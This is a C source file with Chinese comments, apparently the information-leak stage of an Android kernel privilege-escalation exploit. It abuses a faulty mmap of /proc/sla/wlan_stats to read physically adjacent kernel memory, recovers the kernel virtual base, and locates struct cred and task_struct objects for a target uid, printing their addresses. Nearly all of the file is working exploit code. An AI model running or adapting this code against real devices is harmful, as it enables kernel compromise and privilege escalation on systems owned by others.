/* sladump2.c — 零风险(不占 punch)大范围物理相邻扫描器。
 * `stats_map` 走 remap_pfn_range(pfn 逐页 +1, 长度只按 vma)⇒ 映射到的是**物理相邻**的一串页,
 * 里面会混进 SLUB 页 ⇒ 有机会直接看到 struct cred / task_struct。
 * 三件事: (1) 逐页探测可读性(SIGBUS 要用 handler 接住, 页边界对齐才不会越界);
 *         (2) 用"值-自身偏移"的众数求窗口内核虚拟基址 WIN_VA(排序统计, 不再是 O(n^2));
 *         (3) 扫 cred 的字节特征(8 个连续 u32 == 目标 uid)与 task 特征(prio/static_prio==120)。
 * 用法: sladump2 [节点] [uid] [映射MB] */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>

static sigjmp_buf jb;
static volatile int busying;
static void on_bus(int s) { (void)s; if (busying) siglongjmp(jb, 1); _exit(139); }
static uint64_t rd64(unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static uint32_t rd32(unsigned char *p, size_t o) { uint32_t v; memcpy(&v, p + o, 4); return v; }
static int cmpu64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}

int main(int argc, char **argv) {
  const char *f = argc > 1 ? argv[1] : "/proc/sla/wlan_stats";
  int UIDS = argc > 2 ? (int)strtol(argv[2], NULL, 0) : 2000;
  size_t MB = argc > 3 ? (size_t)strtol(argv[3], NULL, 0) : 48;
  signal(SIGBUS, on_bus); signal(SIGSEGV, on_bus);
  int fd = open(f, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("[E] open(%s) errno=%d(%s) => MAC 还在 enforcing\n", f, errno, strerror(errno)); return 1; }
  size_t L = MB * 1024u * 1024u;
  unsigned char *p = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (p == MAP_FAILED) { printf("[E] mmap(%zu) errno=%d\n", L, errno); return 2; }
  printf("[I] mmap %p len=%zu MB=%zu\n", (void *)p, L, MB); fflush(stdout);

  /* (1) 逐页探测可读性 */
  size_t np = L / 4096u, okp = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    busying = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = p[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    busying = 0;
  }
  printf("[I] 可读页 = %zu / %zu (%.1f MB)\n", okp, np, (double)okp * 4096.0 / 1048576.0);
  fflush(stdout);

  /* (2) WIN_VA = mode(value - offset), 排序统计 */
  size_t cap = okp * 512, m = 0;
  uint64_t *k = malloc(cap * sizeof *k);
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= i * 4096u + 4096u && o + 8 <= L; o += 8) {
      uint64_t v = rd64(p, o);
      if (v < 0xffffff8000000000ULL) continue;
      long long kk = (long long)v - (long long)o;
      if (kk < 0xffffff0000000000LL || kk > 0xfffffffffffff000LL) continue;
      if (m < cap) k[m++] = (uint64_t)kk;
    }
  }
  qsort(k, m, sizeof *k, cmpu64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= m; i++) {
    if (i < m && k[i] == k[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = k[i - 1]; } run = 1; }
  }
  printf("[I] 候选数=%zu  WIN_VA=%016llx (自洽槽 %zu)\n", m, (unsigned long long)best, bestn);
  fflush(stdout);

  /* (3) cred 特征 + task 特征 */
  size_t nc = 0, nt = 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 0x28 <= i * 4096u + 4096u && o + 0x28 <= L; o += 4) {
      if (rd32(p, o) != (uint32_t)UIDS) continue;
      int good = 1;
      for (int t = 1; t < 8; t++) if (rd32(p, o + t * 4) != (uint32_t)UIDS) { good = 0; break; }
      if (!good) continue;
      size_t cred = o - 4;
      uint32_t usage = rd32(p, cred);
      printf("[CRED] off=+0x%08zx  VA=%016llx  usage=%u\n", cred,
             (unsigned long long)((long long)cred + (long long)best), usage);
      if (++nc >= 12) break;
    }
    if (nc >= 12) break;
  }
  for (size_t i = 0; i < np && nt < 8; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 0x950 <= i * 4096u + 4096u && o + 0x950 <= L; o += 8) {
      if (rd32(p, o + 0xb4) != 120 || rd32(p, o + 0xb8) != 120) continue;
      uint64_t cr = rd64(p, o + 0x848), rr = rd64(p, o + 0x840), st = rd64(p, o + 0x68);
      if (cr < 0xffffff8000000000ULL || rr < 0xffffff8000000000ULL || st < 0xffffff8000000000ULL) continue;
      printf("[TASK] off=+0x%08zx VA=%016llx stack=%016llx cred=%016llx real=%016llx\n", o,
             (unsigned long long)((long long)o + (long long)best), (unsigned long long)st,
             (unsigned long long)cr, (unsigned long long)rr);
      nt++;
      break;
    }
  }
  printf("[I] cred 命中=%zu  task 命中=%zu\n", nc, nt);
  return 0;
}
